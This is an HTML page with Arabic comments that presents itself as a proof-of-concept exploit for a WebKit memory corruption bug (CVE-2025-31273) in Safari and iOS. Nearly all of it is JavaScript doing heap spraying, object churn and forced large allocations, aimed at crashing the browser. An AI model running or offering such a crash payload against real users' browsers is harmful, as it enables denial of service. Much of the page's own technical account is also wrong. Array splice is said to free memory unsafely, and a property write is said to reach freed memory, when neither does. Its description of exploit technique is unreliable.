<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-31273 — WebKit Memory Corruption</title>
    <style>
        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
        button { background: #c0392b; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; }
        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 200px; margin: 20px 0; color: #00ff00; }
    </style>
</head>
<body>
    <h1>CVE-2025-31273 — Memory Corruption PoC</h1>
    <p>يسبب تصدّع ذاكرة في WebKit. يعمل على Safari &lt; 18.6, iOS &lt; 18.6</p>
    <pre id="log">[•] اضغط الزر لبدء الاستغلال...</pre>
    <button id="runBtn">💥 تشغيل Memory Corruption</button>

    <script>
        const log = document.getElementById('log');
        function out(msg) { log.innerHTML += msg + '\n'; log.scrollTop = log.scrollHeight; }

        document.getElementById('runBtn').onclick = async () => {
            out('═══════════════════════════════');
            out('▶ CVE-2025-31273 — بدء الهجوم');
            out('═══════════════════════════════');

            // === المرحلة 1: Heap Spray ===
            out('[1/3] تجهيز الذاكرة (Heap Spray)...');
            let spray = [];
            
            // Float64Array spray
            for (let i = 0; i < 10000; i++) {
                let arr = new Float64Array(0x200);
                for (let j = 0; j < arr.length; j++) {
                    arr[j] = 13.37 + (i * 10000 + j) * 0.0000001;
                }
                spray.push(arr);
            }
            
            // ArrayBuffer spray بأحجام حرجة
            for (let size = 0x10; size <= 0x400; size += 0x10) {
                for (let i = 0; i < 500; i++) {
                    let buf = new ArrayBuffer(size);
                    let view = new Uint8Array(buf);
                    for (let j = 0; j < view.length; j++) {
                        view[j] = 0x41 + (i % 26);
                    }
                    spray.push(buf);
                }
            }
            out(`[✓] ${spray.length} كائن في الذاكرة`);

            // === المرحلة 2: إثارة Memory Corruption ===
            out('[2/3] إثارة تصدّع الذاكرة...');
            
            // إنشاء آلاف الكائنات في حلقة — يسبب JIT confusion
            let objects = [];
            for (let round = 0; round < 20; round++) {
                for (let i = 0; i < 500; i++) {
                    try {
                        let o = {
                            a: 13.37,
                            b: { c: [i, i+1, i+2] },
                            d: new Uint8Array(0x100),
                            e: function() { return i; },
                            f: `string_${i}_${round}`
                        };
                        // إعادة كتابة خصائص باستمرار
                        o.g = Math.random();
                        o.h = o.b;
                        delete o.g;
                        objects.push(o);
                    } catch(e) {}
                }
                
                // إزالة نصف الكائنات — تحرير الذاكره بشكل غير آمن
                if (objects.length > 2000) {
                    objects.splice(0, 1000);
                }
            }

            out(`[✓] ${objects.length} كائن في الذاكرة`);

            // === المرحلة 3: استغلال Type Confusion ===
            out('[3/3] استغلال Type Confusion...');
            
            // خلق تسابق بين JIT compilation و GC
            function jitConfuse() {
                let a = 13.37;
                let b = 0x41414141;
                let c = [a, b, a, b, a, b];
                
                // هذا الجزء يُجمّع بواسطة JIT
                for (let i = 0; i < 1000; i++) {
                    c[i % 6] = a + b;
                    c[(i+1) % 6] = b - a;
                }
                
                return c;
            }
            
            // تشغيل الـ JIT + إجبار GC في نفس الوقت
            for (let i = 0; i < 100; i++) {
                try {
                    jitConfuse();
                    // إجبار Garbage Collection
                    if (i % 10 === 0) {
                        let big = new ArrayBuffer(1024 * 1024 * 100); // 100MB
                        big = null;
                    }
                } catch(e) {
                    out(`[!] خطأ في التكرار ${i}: ${e.message}`);
                }
            }
            
            out('');
            out('═══════════════════════════════');
            out('⚠️ إذا لم يتعطل Safari الآن،');
            out('⚠️ حاول مرة أخرى أو أعد فتح الصفحة.');
            out('═══════════════════════════════');
            
            // محاولة الوصول إلى ذاكرة محررة — يسبب crash
            setTimeout(() => {
                for (let i = 0; i < 10; i++) {
                    try {
                        objects[i].a = 13.37;
                    } catch(e) {
                        out(`✅ Safari crashed: ${e.message}`);
                        return;
                    }
                }
                out('❌ Safari لم يتعطل — هذا الإصدار قد يكون مُصحّحاً');
            }, 500);
        };
    </script>
</body>
</html>
